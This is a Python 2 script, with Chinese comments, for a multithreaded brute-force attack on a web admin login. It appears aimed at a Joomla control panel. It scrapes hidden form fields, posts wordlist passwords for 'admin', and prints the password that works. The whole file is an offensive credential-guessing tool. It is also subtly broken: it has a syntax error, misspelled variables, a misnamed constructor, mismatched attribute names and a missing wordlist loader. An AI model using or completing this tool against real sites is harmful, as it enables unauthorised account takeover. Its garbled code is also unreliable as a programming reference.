import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser


#一般設定
user_thread   = 10
username      = "admin"
wordlist_file ="/tmp/cain.txt"
resume        = None

#目標專屬設定

target_url  = ""
target_post =
""

username_field = "username"
password_field = "passwd"

success_check  = "Administration - Control Panel"

class Bruter(object):

    def __init__(self,username,words):

        self.username   = username
        self.password_q = words
        self.found      = False

        print ("Finished setting up for: %s" % username)

    def run_bruteforce(self):

        t= threading.Thread(target=self.web_bruter)
        t.start()

    def web_bruter(self):

        while not self.password_q.empty() and not self.found:
            
            brute = self.password_q.get().rstrip()
            jar   = cookielib.FileCookieJar("cookies")   #用fileCookie 建立cookie jar 把cookie 存到cookie
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar)) #

            response = opener.open(target_url)

            page = response.read()

            print("Trying: %s : %s (%d left)" %(self.username,brute,self.password_q.qsize()))

            #解讀出隱藏欄位
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tagresults

            #加入帳號密碼欄位
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post,login_data)

            login_result = login_response.read()

            if success_cheak in login_result:
                self.found = True
                print("[*] Bruteforce successful.")
                print("[*] Username: %s" % username)
                print("[*] Password: %s" % brute)
                print("[*] Waiting for other threads to exit......")

class BruteParser(HTMLParser):

    def __int__(self):

        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self,tag,attrs):

        if tag == "input":

            tag_name = None
            tag_value = None

            for name,value in attrs:

                if name == "name":

                    tag_name = value
                    
                if name == "value":

                    tag_value = value

            if tag_name is not None:

                self.tag_results[tag_name] = value
                    
